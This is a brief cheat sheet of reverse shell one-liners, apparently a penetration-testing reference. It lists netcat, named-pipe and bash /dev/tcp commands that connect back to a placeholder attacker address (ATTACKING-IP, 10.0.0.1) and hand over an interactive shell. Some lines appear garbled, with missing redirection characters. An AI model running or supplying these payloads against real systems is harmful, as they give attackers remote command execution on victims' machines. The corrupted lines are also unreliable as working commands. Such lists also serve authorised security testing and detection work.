# Reverse Shell Cheat Sheet

## Netcat Reverse Shells

> nc -e /bin/sh 10.0.0.1 1234

> /bin/sh | nc ATTACKING-IP 80

> rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p

If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:

> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

## Bash Reverse Shells

> exec /bin/bash 0&0 2>&0

> 0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196

> exec 5<>/dev/tcp/ATTACKING-IP/80
>
> cat <&5 | while read line; do $line 2>&5 >&5; done
>
** or **
>
> while read line 0<&5; do $line 2>&5 >&5; done

> bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
